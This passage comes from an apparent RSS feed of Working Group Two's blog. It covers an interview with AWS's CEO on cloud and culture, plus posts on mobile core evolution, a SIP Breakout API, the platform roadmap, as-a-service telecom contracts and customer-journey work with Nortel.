The cultural question is central. I mean, we see this more and more as I spend time with folks like the two of you and many other CEOs and CEOs around the world. At the end of the day, cloud technology is a means to an end. Ultimately it is about transforming the organization. And that sounds like a big claim. But those are the conversations we're having more and more. What leaders are realizing is that by moving to the cloud, by undergoing a digital and a data transformation, what they can really do is to put data at the center of decision making. They can move faster. They can be more innovative. Ultimately, what that implies is a cultural transformation about how the organization operates. </p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/ccf49d020e88c142e426ce8a09521f01.png" alt="Adam Selipsky, CEO, Amazon Web Services" class="image_HilK"><figcaption class="caption_lOvI">Adam Selipsky, CEO, Amazon Web Services</figcaption></figure><p>Now, to make that happen and to push that in a productive direction. I think that certainly at Amazon, the most important thing is a concept we call customer obsession. We always put our understanding of the customer right at the center of our decision making. We have many mechanisms for understanding at an incredibly detailed level what customers want. And then we work backwards from that. We talk a lot about the working backwards process at Amazon, where we will write press releases and FAQs for any significant new service, any significant new feature or program before we even embark on building the program or service. We work backwards from there and decide, do we have something remarkable? Is it worth building? I think by really putting the customer perspective right at the center of the core decision making is the best way to undergo cultural transformation. </p><p>The other thing I'll just hit on quickly is this concept of having a very long-term perspective, long term view, which is something that folks in the telecom industry certainly understand. But I think at software companies and a lot of other companies, it's less common, less pervasive to think long term. Amazon has been very good at thinking five, ten, even fifteen years down the road. Amazon Web Services is a good example of that. And to understand that building for the long term, you don't just take a series of short little steps, you must have a vision for the long term and build to that part of that topic. </p><p><strong>Sigve:</strong>
As you are working with so many other companies with a legacy history, meaning having for so many years built a culture based on yesterday’s business models and not trying to transform themselves into the future: What have you seen in successful companies trying to make this change? </p><p><strong>Adam:</strong>
Well, every company is a little bit different, but we do see some very common success factors. We can see repeated behavior over and over again by companies who are quickly and successful in making the transition. I would say the first is Top-Down leadership or a leadership mandate that “we are going to reinvent our business, we are going to move to the cloud, we are going to build our customer obsession, we are going to reap not only the cost benefit but become more agile and more innovative as a company.” I think when leaders instill that, they need to eliminate what I sometimes call a “Plan B.” As long as you leave the option open for people in the company to wonder, is there a plan B? Is there another way, do they really mean it, maybe it'll change tomorrow. If you eliminate that and there's only plan A, then everybody tends to get focused in the organization. The second thing I'll say is that it's very useful to have aggressive top-down goals. You want to be deliberate, and you want to be careful. We've seen many teams succeed by saying “We're going to move applications in a month.” There was a CIO of one very large global corporation who did that. By doing that, it gets the team to think differently about what we would have to do to move quickly. The final thing I'll say is important as to who you hire and who you develop. I think it's important to recruit and train people that want to build, people that want to innovate. And then you free them. You unleash them to do that. It really starts with having the right people in the company. </p><p><strong>Sigve:</strong>
Very valuable advice. I must admit that being the CEO of a very successful company over the years, the way I look at that is that one thing is what you need to do yourself. The other main thing you can do to achieve this is to do it through partnerships. You need to change from treating partners like vendors into forming more long-term strategic partnerships. I see that a lot of the innovation is happening in partnership with companies like yourself and other technology companies. This is also a way for us to change our culture.</p><p><strong>Erlend:</strong>
I think you said one thing that I noticed, Adam, which is your incredible, long-term focus. I think we see that as a customer and an AWS user every day. It’s the idea that what we build on today is based on decisions that were made five, ten years ago. There is, I would say, a similar approach in Telenor. I think one noticeable difference between AWS and Telenor is the ability to change and move fast with a long-term mindset, the degree of control of technology and the ability to build and iterate. Short cycles within the long-term perspective. I think that one of the challenges for telecom companies is that they work on these decade-long cycles but the ability to do micro changes within that decade is something that I think the industry really needs to tackle. I think AWS plays a big role in enabling gradual micro improvements in a long-term perspective.</p><figure class="figure_JG9S" style="width:50%;float:left;margin-right:20px"><img src="/jp/76c37c5541ff5ccd80a514f7577bc258.png" alt="Erlend Prestgard, CEO, Working Group Two" class="image_HilK"><figcaption class="caption_lOvI">Erlend Prestgard, CEO, Working Group Two</figcaption></figure><p><strong>Adam:</strong>
There's a cultural point and a technology point there. And on the cultural side at Amazon, we talk sometimes about being strategically patient and tactically impatient. The strategic patience is really having a long- term view of “we are going to get this right as a business.” It may take multiple tries. We're going to have a very long-term view of it. But then, we don't just kind of keep putting more money and more people into things that aren't working. We'll adjust, we’ll measure, we’ll be very self-critical about what's working and what's not working. We'll change a lot of things along the way so that it's a combination of long-term focus and short-term adjustments. I think on the technology side, it's a very fundamental and important observation. Obviously, telco infrastructure, as you said, is not something which changes every three months or every year. And that's why the move to the cloud is so fundamental. You now see telecoms building in the cloud and starting to push services out to the edge using the cloud. I think that it creates a lot more flexibility. You see people building with microservices and having automated deployments. That speeds up all the deployments and provides the flexibility of the cloud for the telco core.  I mean, Telenor is an early runner, with a low-cost virtual mobile network brand in Sweden. You have a cloud-based mobile core developed and managed as a service, in collaboration with Working group Two, Telenor and AWS.  I think that's the type of environment we need. We can't invent the next G overnight, but we can work much more nimbly, much more rapidly and with much, much lower capital cost for telecoms.</p><p><strong>Sigve:</strong>
Erlend, you have taken a position in Europe to try to disrupt the telecom industry by building core mobile platforms in the cloud. We are testing that out ourselves in our own operations. You are also now starting to get external customers. If that really works, this will be a very different software-based way of providing core platform services. How do you see the potential of that? </p><p><strong>Erlend:</strong>
I think what we're going to see is what AWS did to data centers. You're going to see something similar happening to operators. One way of looking at what AWS did to data centers is, you know, everybody had their own data centers running in their own specific ways that were fairly closed and quite specific to the individual deployments. AWS comes in, deploys globally consistent infrastructure and makes it available for third parties. They invite third parties to build on top of it and to publish their products in a marketplace-like logic.  I think what we're going to see is a move towards mobile core platforms for operators where you build a globally consistent set of functionalities that allows you to scale, to attract developers and build global marketplaces. But that can almost only be done if you leverage the global ecosystem of infrastructure providers like Amazon. I think for us, AWS is an absolutely critical factor in putting our application on top of the AWS system in a way that allows the business dynamics that AWS unleashed in the infra layer, also in the telco
application layer. </p><p><strong>Sigve:</strong>
One question I'm often hearing, Adam, is that with security regulations becoming tighter due to developments within areas such as data privacy, is there a limitation to how much we can use the cloud in the telecom space?</p><p><strong>Adam:</strong>
Privacy and security is an incredibly important topic and you see a lot of data sovereignty concerns and a lot of questions about national boundaries
and how data should be treated within and across nations and customers. Consumer privacy is paramount. We've always, since day one, had security as our absolute number one priority. No debate, no questions asked, no deviation allowed. We will drop anything if we have a security opportunity or a security issue. It's cultural for us. As a result, we have a lot of technical capabilities, both around just basic core security and around security and privacy features that we expose to customers.  We're seeing some real innovation from our enterprise customers as well as, of course, from our telecom partners around the world.</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>core</category>
            <category>cloud</category>
            <category>culture</category>
            <category>disruption</category>
        </item>
        <item>
            <title><![CDATA[Q&A with Stephane: The evolution of the mobile core]]></title>
            <link>https://www.wgtwo.com/jp/blog/evolution-of-mobile-core</link>
            <guid>evolution-of-mobile-core</guid>
            <pubDate>Fri, 09 Sep 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[We live, eat and sleep mobile core technology here at Working Group Two. What did a mobile core look like in the past and how is it developing? We threw three quick questions at Stephane Savonitto, a Core Network Engineer at Working Group Two. He has significant mobile core experience, from large network operators and equipment manufacturers.]]></description>
            <content:encoded><![CDATA[<p><em>We live, eat and sleep mobile core technology here at Working Group Two. What did a mobile core look like in the past and how is it developing? We threw three quick questions at Stephane Savonitto, a Core Network Engineer at Working Group Two. He has significant mobile core experience, from large network operators and equipment manufacturers.</em> </p><p><img loading="lazy" alt="Flower punching through" src="/jp/assets/images/flower-6bfbfd730d2dfbe44a5fa219a5a59e68.jpg" width="300" height="163" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-what-was-your-first-meeting-with-a-live-mobile-core">1. What was your first meeting with a live mobile core?<a class="hash-link" href="#1-what-was-your-first-meeting-with-a-live-mobile-core" title="Direct link to heading">​</a></h3><p>I started working for Bouygues Telecom, the third French mobile operator, in 1995. This was during their initial rollout. I was working as a BSS field technician and I participated in the deployment of the first Mobile Switching Center (MSC) in the south of France.</p><figure class="figure_JG9S" style="width:50%;float:right;margin-left:20px"><img src="/jp/b4e656c0a65b6e368e46c33af53e1b05.jpg" alt="General illustration, courtesy Ericsson" class="image_HilK"><figcaption class="caption_lOvI">General illustration, courtesy Ericsson</figcaption></figure><p>This node entity alone completely filled a 400m2 room with three rows, hundreds of back-to-back racks and thousands of specific boards and items... This was very impressive and scary! This equipment was able to handle 100 000 subscribers to make voice calls. SMS had not been introduced at that time 🙂</p><figure class="figure_JG9S" style="width:50%;float:left;margin-right:20px"><img src="/jp/907010f06baa70c12539b172fb492d1a.jpg" alt="General illustration, courtesy Ericsson" class="image_HilK"><figcaption class="caption_lOvI">General illustration, courtesy Ericsson</figcaption></figure><p>After that we’ve seen the telecom world developing rapidly. First we saw smaller room sizes with more compact boards and shelves. The cores could handle more functions, had more capacity and could support more subscribers. This was the last step of pure telecom hardware using common vendor boards (also known as Advanced Telecommunications Computing Architecture - or ATCA). This was also the end of Time-division Multiplexing (TDM) and the start of Internet Protocol (IP) transport. Shortly after virtualization arrived, first on dedicated blades on-premises and today on the public cloud.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-which-role-does-the-core-play-in-a-modern-mobile-network">2. Which role does the core play in a modern mobile network?<a class="hash-link" href="#2-which-role-does-the-core-play-in-a-modern-mobile-network" title="Direct link to heading">​</a></h3><p>Today network technology and standards are going through rapid evolution. This is quickly making equipment obsolete. A core network needs to stay up to date to handle new functionalities, network slicing and so on. Virtualization on the cloud is the way to be able to follow this race with lower investment and faster than conventional core equipment for mobile operators. Internet of Things (IoT) operators, for example, have many subscribers but with low revenue for each subscriber, so to stay profitable it is less expensive for them to go with Network As-a-Service (NaaS) than with a traditional core network. </p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-what-are-the-main-challenges-with-making-mobile-cores-programmable-and-running-them-as-a-service">3. What are the main challenges with making mobile cores programmable and running them as-a-service?<a class="hash-link" href="#3-what-are-the-main-challenges-with-making-mobile-cores-programmable-and-running-them-as-a-service" title="Direct link to heading">​</a></h3><p>Running a mobile network as-a-service has many benefits for operators. Networks are increasingly complex so it is difficult to retain the competent people you need to operate them, maintain network performance, and to deploy the latest technology updates. It is also attractive with the shift to a pay-per-use subscription model and the possibility to scale up or down as needed.</p><figure class="figure_JG9S" style="width:50%;float:right;margin:40px auto"><img src="/jp/3ecf38bcc99eab53ce3289b462182205.jpg" alt="Stephane Savonitto" class="image_HilK"><figcaption class="caption_lOvI">Stephane Savonitto</figcaption></figure><p>But the as-a-service model also introduces new challenges for mobile service providers:</p><ul><li>They have to adopt new technologies rapidly and deploy new services by closely following new standards and market trends. </li><li>They need to have the capability to automate tasks. </li><li>They need to maintain standards capability on the edge and be able to interconnect to any legacy core networking equipment. </li><li>They need to ensure that the highest level of security is always up to date on the network</li><li>They need to be able to shift the focus from merely operating their core to offering innovative, new services to their customers. </li></ul><p><em>Want to learn more about Working Group Two’s cloud-native and programmable mobile core platform? <a href="https://www.wgtwo.com/contact/" target="_blank" rel="noopener noreferrer">Get in touch with us</a></em></p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>core</category>
            <category>BBS</category>
            <category>cloud</category>
            <category>virtualization</category>
        </item>
        <item>
            <title><![CDATA[Hello abundance, bye-bye complexity: With this new public API you can plug multiple switchboards into the call path - without knowing what a call path is]]></title>
            <link>https://www.wgtwo.com/jp/blog/releasing-sip-breakout-api</link>
            <guid>releasing-sip-breakout-api</guid>
            <pubDate>Thu, 07 Jul 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[We love making telecom easier and scalable. This week we’ve released SIP Breakout, a new public API from Working Group Two. It simplifies the process of deploying SIP-enabled services, such as a PBX.]]></description>
            <content:encoded><![CDATA[<p>We love making telecom easier and scalable. This week we’ve released <a href="https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites" target="_blank" rel="noopener noreferrer">SIP Breakout</a>, a new public API from Working Group Two. It simplifies the process of deploying SIP-enabled services, such as a PBX.</p><p><img loading="lazy" alt="Abundance of fruit in market stall" src="/jp/assets/images/fruit-landscape-905e461605c84836e7d8eebe58887810.png" width="300" height="149" class="img_ev3q"></p><p>The <a href="https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites" target="_blank" rel="noopener noreferrer">SIP Breakout</a> allows for configuration on a per-subscription basis, which means that operators on the Working Group Two platform can easily offer a range of different SIP-services to their customers. The typical example is a PBX, otherwise known as a switchboard. </p><p>Meanwhile a product developer - say, a company that makes PBXs for a living - benefits from implementing their product once for all operators on the platform. That means no major new development project every time, but a one-time implementation on a standardized and well-documented public API. (Insert upbeat music here). </p><blockquote><p><strong>Fact box</strong>
Hold on a second, what’s a SIP? A Session Initiation Protocol (SIP) session is any live communication, such as phone calls, conferencing and even video. The “protocol” part of the term just means that it’s a set of universal standards for computer communication. Typical examples of a SIP-enabled service are phone calls with Voice over IP, switchboard/PBX and even computer games.</p></blockquote><p>So what’s in it for people using the mobile network? This means that when your local plumbing company or that huge global accounting firm asks their mobile operator for a PBX to help them manage calls and messages with their customers they don’t get a one-size-fits-all solution. The operator can offer them a variety of solutions and usage-based, scalable pricing models. </p><p><strong>Let’s drill down a bit further.</strong> </p><p>By introducing our new SIP Breakout API we open up our core network to a range of SIP-enabled products. This is significant because SIP products are a bit more complex than other products. So simplifying and standardizing the process makes a difference. The new API allows PBX providers to plug their SIP-enabled endpoints into the call path. This establishes a session integration between Working Group Two’s core and a PBX for a given MSISDN (a unique number that identifies a mobile phone on a network). </p><p>Virtual SIP registrations are used to alter default call behavior and involve (e.g. a) PBX into the SIP signaling path. For mortals, this simply means that a phone call into a network can be answered, closed or routed somewhere. You can also think about it as registering and unregistering on the network. </p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/461ba186cb154f3e3ce72045a0b1805f.png" class="img_ev3q"><p>Developers don’t need a lot of knowledge about the <a href="https://www.nextiva.com/voip-definitions/call-path.html" target="_blank" rel="noopener noreferrer">call path</a>, they can use the SIP Breakout API to get signaling to their PBXs, voicemail systems and other SIP-enabled services. </p><p>The API is implemented as a <a href="https://en.wikipedia.org/wiki/GRPC" target="_blank" rel="noopener noreferrer">gRPC</a> service. We believe it is a more reliable way of implementing and supporting almost any language. When we dropped our first batch of public APIs back in March, we also explained why we’ve chosen gRPC. </p><p><a href="https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites" target="_blank" rel="noopener noreferrer">SIP Breakout</a> is available as a public API. You can play around with it in our sandbox right now.</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>api</category>
            <category>sip</category>
            <category>pbx</category>
            <category>developers</category>
        </item>
        <item>
            <title><![CDATA[What we're building on the platform right now: 5GSA, 5GNSA, OCS, content filtering, VoNR, VoLTE on sXGP, VoLTE roaming, support for PBX from Telavox... and more ]]></title>
            <link>https://www.wgtwo.com/jp/blog/what-we-build-right-now-june22</link>
            <guid>what-we-build-right-now-june22</guid>
            <pubDate>Thu, 23 Jun 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Our global mobile core platform is rapidly evolving. Here's what the team is building right now.]]></description>
            <content:encoded><![CDATA[<p>Our global mobile core platform is rapidly evolving. Here's what the team is building right now.</p><p><img loading="lazy" alt="Working Group Two team talking" src="/jp/assets/images/teamtalking-1530b6b8a315a1aae2916a742cb523ba.jpg" width="500" height="270" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="action-on-the-platform">Action on the platform<a class="hash-link" href="#action-on-the-platform" title="Direct link to heading">​</a></h3><p>We’ve completed end-to-end testing for <strong>5G Standalone</strong> (5G SA) - both for large scale MNOs as well as for Fixed Wireless Access and Private Networks. Our as-a-service model and programmable core capabilities allow for high performance, operational simplicity and reduced costs for 5G SA.</p><p><strong>5G Non-Standalone</strong> (5G NSA) is in production. NSA makes it easier for operators to deploy a 5G network - because they can reuse current 4G facilities. Together with 2G/3G full-MVNO/national roaming capabilities and full 4G/5G capabilities operators can now get a “G-neutral” core network.</p><p><strong>Telavox</strong>, a leading UCaaS provider from the Nordics, is now live on the Working Group Two platform - which means that we have integrated their mobile unified comms technology and PBX on our platform via an API. <a href="https://telavox.com" target="_blank" rel="noopener noreferrer">Telavox</a> is known for an excellent user experience and a strong feature set and we believe they are one of the most attractive global providers of UCaaS and PBX services.</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/d2cbfb2b2ba5308f9477d1a88cc2337d.jpg" class="img_ev3q"><p>We have developed interfaces that enable <strong>real-time online charging control</strong> (Gy/Ro) and have gone live with this capability with our first OCS/BSS partners.</p><p>Want to control content? This spring, we enabled <strong>content filtering</strong> on our platform, providing control on a per-subscriber basis. The integration uses the Internet Content Adaptation Protocol <a href="https://en.wikipedia.org/wiki/Internet_Content_Adaptation_Protocol" target="_blank" rel="noopener noreferrer">(ICAP)</a> for inspecting HTTP-based traffic and DNS-based filtering of data traffic. This system can be used for everything from parental control to enforcing corporate policies.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="voice-is-on-your-lips">Voice is on your lips<a class="hash-link" href="#voice-is-on-your-lips" title="Direct link to heading">​</a></h3><p>Voice continues to be relevant across “Gs”, usage areas and handset types. With our unique approach, we can rapidly adapt our voice stack to emerging needs - such as:</p><p>Enabling voice for <strong>5G Standalone</strong> (VoNR) is in the works. We see the strong effects of taking a platform approach, where adding VoNR becomes a relatively straightforward exercise.</p><p>We continue getting our <strong>IMS stack certified for an increasing number of handsets</strong> across several markets and operator codes. We can see the effects of our platform approach here as well, where each device, operator and market becomes easier. A new operator on the platform can with confidence know that certifications will be passed and carrier bundles issued.</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/43428765d54f8e22487a1fbeac67cd13.jpg" class="img_ev3q"><p>In <strong>Japan</strong> we have a fantastic demo where the customer can plug in a base station, and minutes later be able to make VoLTE calls between devices in a private network setting. Japan has for a long time had what they call sXGP (a standard for unlicensed 4G  spectrum). At Working Group Two we are building a complete private network solution that in addition to data, also includes includes communication services.</p><p>We’re <strong>rolling out VoLTE roaming</strong> with a major IoT player. Voice might not be the biggest business area for IoT, but without it, many IoT players will struggle to satisfy customer demands. We can offer speed, simplicity and affordability for operators that require VoLTE-as-a-service.</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>5g</category>
            <category>ocs</category>
            <category>vonr</category>
            <category>volte</category>
            <category>pbx</category>
            <category>building-now</category>
        </item>
        <item>
            <title><![CDATA[The business case for not needing a business case]]></title>
            <link>https://www.wgtwo.com/jp/blog/no-need-for-a-business-case</link>
            <guid>no-need-for-a-business-case</guid>
            <pubDate>Thu, 09 Jun 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[You’ve heard these terms a million times: Managed services and software-as-a-service. At first glance, they appear deceptively similar. You wonder, how are they different again? Understanding the difference between them unlocks a perspective on where the telecom industry is heading.]]></description>
            <content:encoded><![CDATA[<p>You’ve heard these terms a million times: <em>Managed services</em> and <em>software-as-a-service</em>. At first glance, they appear deceptively similar. You wonder, how are they different again? Understanding the difference between them unlocks a perspective on where the telecom industry is heading. </p><p><img loading="lazy" alt="Let the RFP burn. Give your vendor a service-level agreement instead and let them figure out how to solve your business needs" src="/jp/assets/images/RFP_illustration_large-39c5db89b4f25cdf07dfc1d187e75d7d.jpg" width="738" height="400" class="img_ev3q"></p><p>Consider CKH IOD, an innovation unit of CK Hutchison, one of the world's leading mobile operator groups. When <a href="https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud/" target="_blank" rel="noopener noreferrer">they announced</a> a few months ago that they will be moving their mobile core network to the public cloud - and have it delivered as-a-service by Working Group Two -  they benefit from more than a new technology platform. They enter a new way of thinking about incentives - where vendors and operators truly share the benefits of growing together. More importantly, CKH IOD proves that they both can and want to innovate. </p><p>One of their main ambitions is to reduce complexity. The value of reducing complexity is to be able to make changes faster - and more affordably. </p><p><strong>And therein is the power of as-a-service over a managed service</strong>. It’s the idea that you can only get platform thinking to flourish when you throw out your rigid approach of making every change a business case. </p><p>Granted, it’s not about totally letting go of control across commercial, technological, and legal dimensions. Your contract needs to allow for frequent, small changes while your tech setup needs to allow for safe and efficient rollout of these frequent changes. </p><p>Operators wanting to innovate must consider the underpinning, but tricky idea of incentives. To drive change, you actively need to manage incentives. In a traditional, managed services setup, operators specify a detailed scope from their vendors and conduct some kind of auction to select their vendor. </p><p>This means that when vendors respond to a request, their incentives are to deliver on the scope defined in the cheapest way possible. And that, in short, defines the relationship three or four years down the road until the next major request for proposals comes along. For the traditional vendor, the economic upside is to save cost by delivering as cheaply as possible and by driving as many pricey change requests they can. Fundamentally, then, things either remain static or every change needs a business case. Yawn. </p><p><strong>Complex, yet simple animals</strong>. That’s the short way of thinking about operators’ incentives.</p><p>Simple in the sense that operators are driven by basic things like revenue per user, churn, and customer acquisition costs. They want to increase their topline and decrease their cost. They are constantly pressured to increase usage, adjust to macroeconomic conditions, and get ready to jump on the next “G.” The reality is often that they are unable to increase their revenues, so life is about finding the next avenue for cost reduction. </p><p>Complex, because achieving cost reductions and driving growth require changes. Just waiting for the next “G” delivers no differentiation versus competitors. Operators have been amazingly innovative in marketing and billing, but that is mostly driven by improvements in IT. At the network level, the fundamentals have essentially stayed the same since the advent of SMS. </p><p>To be a bit blunt, operators have in some ways chosen the worst of both worlds. They have chosen an outsourced model, but they’re not taking advantage of it. Technology vendors are essentially told how to solve the problem. </p><p>Instead, operators should give them a service-level agreement (SLA) with what they want to achieve and then let the vendor figure out how to solve it. While the rest of the world has figured out when to do things in-house and when to outsource, mobile operators are often stuck in the middle. </p><p><strong>What’s the magic pill?</strong> Micro innovation at scale. How do you make it happen? In the words of Appledore Research, by understanding that as-a-service is more than a simple substitution of capital costs with an operational one - and more than replacing a one-time expense with an amortized one. </p><p>Here’s how Robert Curran at Appledore Research broke it down in his recent report on the significance of the deal between Working Group Two and CKH IOD. </p><table><thead><tr><th align="center"></th><th align="center"><strong>Managed Service</strong></th><th align="center"><strong>As-a-Service</strong></th></tr></thead><tbody><tr><td align="center"><strong>Deployment</strong></td><td align="center">Customer specific</td><td align="center">Common platform used by all customers</td></tr><tr><td align="center"><strong>Support</strong></td><td align="center">Customer-specific team</td><td align="center">Shared team</td></tr><tr><td align="center"><strong>Change Management</strong></td><td align="center">Contractual negotiation – change  Requests and specification cycles</td><td align="center">Frequent platform updates, constant  feedback from customers</td></tr><tr><td align="center"><strong>SLA</strong></td><td align="center">Process-defined – requires extensive list of activities to be defined, targets and costs</td><td align="center">Service-defined – availability and quality of the service provided</td></tr><tr><td align="center"><strong>Contract</strong></td><td align="center">High upfront cost to define scope and  terms; difficult and expensive to change  subsequently</td><td align="center">Standardized contract terms, based on simple to understand SLAs</td></tr><tr><td align="center"><strong>Business Model</strong></td><td align="center">Fixed cost envelope, no incentive to  innovate</td><td align="center">Usage-based model, incentivized to make changes that improve customer experience/service quality</td></tr><tr><td align="center"><strong>R&amp;D</strong></td><td align="center">No dedicated resources to support R&amp;D</td><td align="center">Direct flow through from core R&amp;D to in-use platform</td></tr></tbody></table><p>Which column feels more exciting to you? </p><p>Clearly, Joe Parker, the CEO of CKH IOD, leans heavily to the right when he says this about taking the step of moving their core network to the public cloud:</p><blockquote><p>“Our collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency, and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT, and Private Network space. It’s about achieving scale and the highest levels of security while reducing complexity – to the benefit of our customers and ultimately, end-users in our markets.”</p></blockquote><p>Ok, so there’s a historical perspective with regards to managed services  to consider. Telecom workloads used to be considered extremely demanding, so you made hardware specifically for it - and then bundled the software. There was no such thing as the cloud, so you had to put your technology in every mobile operator basement. Making a change was almost impossible. Forget about driving micro innovations at scale. </p><p>In the modern day, where we do have a cloud - in all its varieties - and where the toolbox for change is available, there is still a lot of conservative thinking. Security and regulatory challenges are critical - but you need to find a way to frame and work with those challenges. </p><p>Better yet, think about the vendor of the future.</p><p>Operators should encourage them to get better at what they are doing at lower costs. </p><p>You want to enable and incentivize them to increase your topline. It’s by connecting the vendor’s economic goals to your own by sharing revenue from more users and increased usage. With revenue share, the vendor wants to make the solution as good as possible. With a change request, the vendor wants to create the solution as cheaply as possible.
So at the end of the day it is about aligning incentives. </p><p><strong>At Working Group Two we don’t want to charge for change requests.</strong> We want to deliver micro innovation as a service at scale and win when our customers and their customers win. That’s the only business case you should ever need to make. </p><p>We believe in a future where there are a smaller number of global mobile core platforms to which operators - big and small - can connect their radio networks. We think this will drive down the total cost of  core networks down by 30-50% and the pace of innovation up orders of magnitude.</p>]]></content:encoded>
            <category>saas</category>
            <category>operators</category>
            <category>managed services</category>
        </item>
        <item>
            <title><![CDATA[Building a product ecosystem: Here's a question mobile operators need to hear more often.]]></title>
            <link>https://www.wgtwo.com/jp/blog/nortel-ecosystem</link>
            <guid>nortel-ecosystem</guid>
            <pubDate>Fri, 20 May 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[“Can I book you for a two-hour meeting so we can start sketching out your customer's journey?” This is not a question that a telco operator normally hears. But it was exactly this question that we asked the Head of Product at Nortel - a mobile operator targeting small and medium-sized businesses in Norway.]]></description>
            <content:encoded><![CDATA[<p><strong>“Can I book you for a two-hour meeting so we can start sketching out your customer's journey?”</strong> This is not a question that a telco operator normally hears. But it was exactly this question that we asked the Head of Product at Nortel - a mobile operator targeting small and medium-sized businesses in Norway.</p><p>Why <a href="https://www.nortel.no" target="_blank" rel="noopener noreferrer">Nortel?</a> Well we learned from their MVNe, eRate, that our product ecosystem will "be music to Nortel's ears". In a crowded market with established players, Nortel has been on the lookout for something that could differentiate them from their competitors - the product ecosystem is that differentiator, where according to Nortel’s COO:  “That's where we want to go, and we want to be unique. We want to be a step ahead.”</p><p>But to really understand why our ecosystem was going to be 'music to Nortel's ears', we needed to get a much deeper understanding of Nortel and their customers - enter user research. We could have chosen to take this easy, short-term route down <em>Assumption Avenue</em>:</p><img loading="lazy" width="40%" align="right" style="display:block;margin:auto 10px" src="/jp/e4d91f929a566d2d38a59b37a0216540.jpg" class="img_ev3q"><p>With 20+ years of user research under my belt, I knew that direct collaboration with our target audience, though more time-consuming, will result in more useful, easy to use, and desirable products and experiences - thus the initial two-hour meeting request. Being an operator, Nortel is one of our three target audiences (along with subscribers and product developers). And while Nortel may not be the actual target audience for the customer journey work we are doing with them  - their subscribers are - their deep knowledge of their user base, coupled with their ability to ultimately give us access to them, was a much more appealing option than taking a wrong turn on Assumption Ave.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="customer-journey-mapping-with-nortel">Customer journey mapping with Nortel<a class="hash-link" href="#customer-journey-mapping-with-nortel" title="Direct link to heading">​</a></h2><p>Can you tell us a bit about your customers? What are the typical stages of their journey when they interact with you? What are they doing during each of the stages? What challenges are they facing? What opportunities do Nortel and wgtwo have together to address these challenges? These are some of the key questions we posed to Robert (CPO), Espen (COO), and Sigrid (Sales Ops/HR mgr).</p><p>During three highly interactive sessions, we sketched out the customer journey on an online whiteboard. It started with this blank canvas:</p><p><img loading="lazy" src="/jp/assets/images/canvas1-4f461feb6b3bcea44e65c7c57aeb60c8.png" width="512" height="282" class="img_ev3q"></p><p>Six hours later, it evolved into a customer journey rich with tasks, challenges, and opportunities:</p><p><img loading="lazy" src="/jp/assets/images/canvas2-f479f6099766cd6ac16b35cf59a6c3b1.png" width="512" height="266" class="img_ev3q"></p><p>But how did we get there? In order to accomplish what we accomplished together, we needed Nortel to trust that we were doing the right thing, and it was worth their effort to take time out of their busy schedules. Robert described his motivation to participate this way:</p><blockquote><p>“We have to be tactical when we are going to migrate to the wgtwo platform, and if you don't have some more additional features when the customer migrates, they’ll  think ‘what was the reason for doing this?’ And so we have to wrap it with some nice features that will feel like an upgrade rather than just a SIM card change….What I want to finish with this exercise is to map how our customers…can purchase these services.” (Robert, Nortel CPO)</p></blockquote><p>With motivation in place along with our blank journey canvas, we went to work. We defined their core users (both migrating and new) in the form of <strong>personas</strong>, whom Sigrid thought “matched their customers”:</p><img loading="lazy" width="30%" align="left" style="display:block;margin:auto 10px" src="/jp/e124d65cbd40a763c350ae1d270e973d.png" class="img_ev3q"><p><strong>Carl</strong> owns a contracting business, and he’s looking for an operator, who has a self-service system so he can focus less on onboarding and support and more on growing his business.</p><img loading="lazy" width="30%" align="right" style="display:block;margin:auto 10px" src="/jp/e8568fb92f916a52f19daa535da17aff.png" class="img_ev3q"><p><strong>Mike</strong> is a current Nortel customer, who expects to migrate to Nortel’s MVNO, but he just wants to make sure he doesn’t have to pay more than he is paying now and hopefully he’ll get a few ‘carrots’ along the way</p><img loading="lazy" width="30%" align="left" style="display:block;margin:auto 10px" src="/jp/5181ec7a3ee8df409f4fff0fa11ecef2.png" class="img_ev3q"><p><strong>Eddie</strong> is an electrician, who very much needs reliable coverage so his boss (either Mike or Carl) can reach him and vice versa when a job needs to be done or a question needs an answer</p><p>Our discussions taught us, among other things, the challenges along the journey for potential customers, for example, Carl to become aware of a small MVNO like Nortel in their ‘discovery’ stage; the difficulties they face in comparing different plans after they discover Nortel; the carrots for migrating customers like Mike to see the benefits of staying with Nortel or going over to a competitor; both Carl’s and Mike’s lack of faith, during the ‘mapping the customer needs’ stage, in a disruptor like Nortel to deliver both standard and add-on services at a comparable or better level as the ‘big guys’; the lack of compelling products for someone like Eddie to add to his subscription during the ‘product delivery’ stage; and both Mike and Carl’s reliance on customer service to use their PBX in the ‘request support’ stage.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="participatory-design-and-prioritizing-the-product-roadmap">Participatory design and prioritizing the product roadmap<a class="hash-link" href="#participatory-design-and-prioritizing-the-product-roadmap" title="Direct link to heading">​</a></h2><p>With the help of the customer journey mapping process, all of these challenges became opportunities that Nortel and wgtwo have started to address in a number of highly engaged participatory design sessions.</p><p>We iterated several times on redesigning the experience of how Mike or Eddie can add, 